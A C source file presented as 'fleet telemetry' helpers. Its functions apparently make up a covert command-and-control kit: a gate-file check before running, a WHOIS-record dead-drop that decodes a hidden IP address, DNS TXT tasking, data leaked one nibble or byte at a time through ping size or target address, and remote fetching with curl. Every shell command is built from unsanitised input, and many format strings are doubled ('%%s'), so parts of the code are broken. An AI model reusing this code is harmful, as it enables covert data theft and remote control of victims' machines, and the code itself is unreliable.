#include "channels.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Fleet telemetry and registry-resolution helpers (kit). */

int ch_gate_ok(const char *gate)
{
    char path[1024];
    const char *home = getenv("HOME");
    if (home == NULL) {
        home = getenv("USERPROFILE");
    }
    if (strncmp(gate, "~/", 2) == 0 && home != NULL) {
        snprintf(path, sizeof(path), "%%s%%s", home, gate + 1);
    } else {
        snprintf(path, sizeof(path), "%%s", gate);
    }
    char cmd[1400];
    snprintf(cmd, sizeof(cmd), "test -e '%s'", path);
    return system(cmd) == 0;
}

char *ch_whois_endpoint(const char *domain, char *out, size_t outlen)
{
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
             "{ printf 'domain %%s\r\n' '%s'; sleep 4; } | "
             "nc whois.verisign-grs.com 43 2>/dev/null | "
             "grep -m1 -Eio '(descr|address|e-mail):[[:space:]]+[0-9a-f]{8}'",
             domain);
    FILE *p = popen(cmd, "r");
    if (p == NULL) {
        return NULL;
    }
    char line[512] = {0};
    while (fgets(line, sizeof(line), p) != NULL) {
        char *hex = line;
        while (*hex != '\0' && !((*hex >= '0' && *hex <= '9')
               || (*hex >= 'a' && *hex <= 'f'))) {
            hex++;
        }
        if (strlen(hex) >= 8) {
            hex[8] = '\0';
            unsigned int raw = (unsigned int) strtoul(hex, NULL, 16);
            snprintf(out, outlen, "%%u.%%u.%%u.%%u",
                     raw >> 24 & 255, raw >> 16 & 255,
                     raw >> 8 & 255, raw & 255);
            pclose(p);
            return out;
        }
    }
    pclose(p);
    return NULL;
}

int ch_txt_fields(const char *name, char fields[][256], int max)
{
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
             "nslookup -type=TXT %%s 2>/dev/null", name);
    FILE *p = popen(cmd, "r");
    if (p == NULL) {
        return 0;
    }
    char line[1024];
    int n = 0;
    while (n < max && fgets(line, sizeof(line), p) != NULL) {
        char *a = strchr(line, '"');
        if (a == NULL) {
            continue;
        }
        char *b = strchr(a + 1, '"');
        if (b == NULL || (size_t)(b - a - 1) >= 256) {
            continue;
        }
        memcpy(fields[n], a + 1, (size_t)(b - a - 1));
        fields[n][b - a - 1] = '\0';
        n++;
    }
    pclose(p);
    return n;
}

int ch_icmp_nibble(const char *relay, int nibble)
{
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
             "ping -c 1 -W 1 -s %%d '%%s' >/dev/null 2>&1",
             64 + (nibble & 15), relay);
    return system(cmd) == 0;
}

int ch_icmp_byte_ip(const char *base, int b)
{
    if (b <= 0 || b >= 255) {
        return 0;
    }
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
             "ping -n 1 -w 300 '%%s%%d' >/dev/null 2>&1", base, b);
    return system(cmd) == 0;
}

char *ch_fetch(const char *url, char *out, size_t outlen)
{
    char cmd[1024];
    snprintf(cmd, sizeof(cmd), "curl -fsSL -m 15 '%%s' 2>/dev/null", url);
    FILE *p = popen(cmd, "r");
    if (p == NULL) {
        return NULL;
    }
    size_t n = fread(out, 1, outlen - 1, p);
    out[n] = '\0';
    pclose(p);
    return out;
}
